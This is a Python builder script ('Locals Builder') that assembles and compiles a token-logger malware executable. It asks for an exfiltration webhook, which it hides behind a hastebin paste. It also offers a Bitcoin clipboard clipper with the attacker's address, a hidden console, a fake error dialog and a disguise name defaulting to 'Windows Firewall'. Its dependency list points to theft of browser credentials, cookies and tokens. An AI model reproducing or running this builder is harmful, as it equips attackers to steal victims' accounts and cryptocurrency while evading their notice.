print("Loading, this may take a couple of minutes.")
import subprocess
import os
import time
import shutil
import random

modulesToInstall = ["requests", "alive_progress", "colorama", "pyfiglet"]

def setup(module: str):
        attempt = subprocess.getoutput(f"pip install {module}")
        if "'pip' not recognized" in attempt:
            print("[-] Pip was not found.")
            exit()
        else:
            return

for name in modulesToInstall:
    if name == "alive_progress":
        try:
            exec("from alive_progress import alive_bar")
        except ImportError:
            setup("alive-progress")
            exec("from alive_progress import alive_bar")
    elif name == "colorama":
        try:
            exec("from colorama import Fore, Style, init")
        except ImportError:
            setup("colorama")
            exec("from colorama import Fore, Style, init")
    try:
        exec("import " + name)
    except ImportError:
        setup(name)
        exec("import " + name)

randList = ["sland", "standard", "doom", "epic", "big"]

f = pyfiglet.Figlet(font=random.choice(randList))
init()

def title():
    print(Fore.BLUE + Style.BRIGHT + f.renderText('Locals Builder'))
    print(Fore.CYAN + Style.BRIGHT + "          Made by Local#0001 | github.com/localsgithub\n")

def transition(text):
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 3")
    time.sleep(1)
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 2")
    time.sleep(1)
    clear()
    title()
    print(Fore.MAGENTA + Style.BRIGHT + f"[!] {text} in 1")
    time.sleep(1)
    clear()
    title()

def clear():
    if os.name == 'nt':
        os.system('cls')
    elif os.name == "posix":
        os.system('clear')

def build():
    check = subprocess.getoutput("pyinstaller")
    if "'pyinstaller' not recognized" in check:
        print(Fore.RED + Style.BRIGHT + "[-] PyInstaller was not found. Attempting to install.")
        tryInstall = subprocess.getoutput("pip install pyinstaller")
        print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller has been successfully installed.")
    else:
        print(Fore.GREEN + Style.BRIGHT + "[+] PyInstaller is already installed.")
    time.sleep(1)
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[!] Attempting to compile token logger to executable.")
    with alive_bar(4, stats=False, enrich_print=False, spinner="classic") as barr:
        compileFile = subprocess.getoutput('pyinstaller --noconfirm --onefile --console --clean --noupx  "result/TokenLogger.py"')
        with open("log.txt", "w", encoding="utf-8") as log:
            log.write(compileFile)
            log.close()
        if "Building EXE from EXE-00.toc completed successfully." in compileFile:
            print(Fore.GREEN + Style.BRIGHT + "[+] Executable created. Cleaning up.")
            pass
        else:
            print(Fore.RED + Style.BRIGHT + "[-] An error has occured while attempting to compile logger. Error has been logged to 'log.txt'")
            exit()
        barr()
        if os.path.exists("TokenLogger.spec"):
            os.remove("TokenLogger.spec")
        else:
            pass
        barr()
        try:
            shutil.rmtree("build")
        except:
            pass
        barr()
        try:
            os.rename("dist", "EXE")
        except:
            pass
        barr()
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[+] Success! Executable saved to 'EXE'")
    exit()
    
class ExceptionTemplate(Exception):
    def __str__(self):
        return ' '.join(self.args)

def makePaste(webhook: str):
    r = requests.post("https://hastebin.com/documents", data=webhook).json()
    return "https://hastebin.com/raw/" + r['key']

def requirements():
    def install(module: str):
        print(Fore.RED + Style.BRIGHT + f"[-] Module '{module}' was not found. Attempting to install.")
        attempt = subprocess.getoutput(f"pip install {module}")
        if "'pip' not recognized" in attempt:
            print(Fore.RED + Style.BRIGHT + "[-] Pip was not found.")
            exit()
        else:
            return print(Fore.GREEN + Style.BRIGHT + f"[+] Module {module} was successfully installed.")

    def check(modules: list, bar):
        print(Fore.YELLOW + Style.BRIGHT + "\n[!] Restart this script if requirements take longer than 2 minutes to install.\n\n")
        for module in modules:
            try:
                if module == "Pillow":
                    exec(f"import PIL")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module {module} is already installed. Continuing.")
                    bar()
                    continue
                elif module == "pypiwin32":
                    exec("import win32api\nimport win32con\nfrom win32crypt import CryptUnprotectData\nimport win32crypt\nfrom win32com.client import GetObject")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pypiwin32 is already installed Continuing.")
                    bar()
                elif module == "pywin32":
                    exec("import win32api\nimport win32con\nfrom win32crypt import CryptUnprotectData\nimport win32crypt\nfrom win32com.client import GetObject")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pywin32 is already installed Continuing.")
                    bar()
                elif module == "pycryptodome":
                    exec("from Crypto.Cipher import AES")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module pycryptodome is already installed. Continuing.")
                    bar()
                else:
                    exec(f"import {module}")
                    print(Fore.YELLOW + Style.BRIGHT + f"[+] Module {module} is already installed. Continuing.")
                    bar()
            except ImportError:
                if module == "Pillow":
                    install("Pillow")
                    bar()
                    continue
                elif module == "pypiwin32":
                    install("pypiwin32")
                    install("pywin32")
                    bar()
                elif module == "pywin32":
                    install("pypiwin32")
                    install("pywin32")
                    bar()
                elif module == "pycryptodome":
                    install("pycryptodome")
                    bar()
                else:
                    install(module)
                    bar()
        return
    
    transition("Checking for requirements")
    listOfModules = ["wmi", "windows_tools.product_key", "winregistry", "psutil", "Pillow", "pypiwin32", "browser_cookie3", "pycryptodome", "pywin32", "requests", "psutial"]
    with alive_bar(len(listOfModules), stats=False, enrich_print=False, spinner="classic") as bar:
        check(listOfModules, bar)
    time.sleep(3)
    return True

def start():
    with open("assets/start.txt", "r", encoding="utf8") as file:
        code = file.read()
        file.close()
    webhook = input(Fore.GREEN + Style.BRIGHT + "[?] Webhook: ")
    code += "pastebin = '" + makePaste(webhook) + "'\n"
    clear()
    title()
    debug = input(Fore.GREEN + Style.BRIGHT + "[?] Debugger? (Press enter for default) (y/n): ")
    if debug == "y":
        code += "debugger = True\n"
    elif debug == "n":
        code += "debugger = False\n"
    else:
        code += "debugger = False\n"
    clear()
    title()
    btc = input(Fore.GREEN + Style.BRIGHT + "[?] BTC Clipper? (Press enter for default) (y/n): ")
    if btc == "y":
        code += "btc = True\n"
        btcadd = input(Fore.GREEN + Style.BRIGHT + "[?] BTC Address: ")
        code += f"BTC_ADDRESS = '{btcadd}'\n"
    elif btc == "n":
        code += "btc = False\n"
    else:
        code += "btc = False\n"
    clear()
    title()
    hide = input(Fore.GREEN + Style.BRIGHT + "[?] Hide Console? (Press enter for default) (y/n): ")
    if hide == "y":
        code += "hiddenWindow = True\n"
    elif hide == "n":
        code += "hiddenWindow = False\n"
    else:
        code += "hiddenWindow = True\n"
    clear()
    title()
    error = input(Fore.GREEN + Style.BRIGHT + "[?] Display Fake Error? (Press enter for default) (y/n): ")
    if error == "y":
        code += "fakeError = True\n"
        errorMsg = input(Fore.GREEN + Style.BRIGHT + "[?] Fake Error Message?: ")
        code += f"fakeErrorMessage = '{errorMsg}'\n"
        errorTitle = input(Fore.GREEN + Style.BRIGHT + "[?] Title of error message?: ")
        code += f"fakeErrorTitle = '{errorTitle}'\n"
    elif error == "n":
        code += "fakeError = False\nfakeErrorMessage = '.'\nfakeErrorTitle = '.'\n"
    else:
        code += "fakeError = False\nfakeErrorMessage = '.'\nfakeErrorTitle = '.'\n"
    clear()
    title()
    fakeFileName = input(Fore.GREEN + Style.BRIGHT + "[?] Fake File Name? (Press enter for default): ")
    if fakeFileName == "":
        code += "FakeFileName = 'Windows Firewall'\n"
    else:
        code += f"FakeFileName = '{fakeFileName}\n'"
    with open("assets/end.txt", "r", encoding="utf8") as endFile:
        endOfCode = endFile.read()
    code += endOfCode
    with open("result/TokenLogger.py", "w") as file:
        file.write(code)
        file.close()
    clear()
    title()
    print(Fore.GREEN + Style.BRIGHT + "[+] Token Logger has been saved to 'TokenLogger.py'\n")
    compileMaybe = input(Fore.YELLOW + Style.BRIGHT + "[?] Compile to executable? (y/n): ")
    if compileMaybe == "y":
        transition("Transferring to compiler")
        build()
    else:
        exit()
        
if __name__ == '__main__':
    if requirements() == True:
        try:
            transition("Transferring to builder")
            start()
        except FileNotFoundError as e:
            class AssetsMissing(ExceptionTemplate):
                __module__ = Exception.__module__ 
                pass
            raise AssetsMissing("Please ensure that the assets folder is intact and has all of the neccessary files.") from None
        except PermissionError as e:
            class AccessDenied(ExceptionTemplate):
                __module__ = Exception.__module__ 
                pass
            raise AccessDenied("Access Denied. Please run this script as a administrator in order for it to function.") from None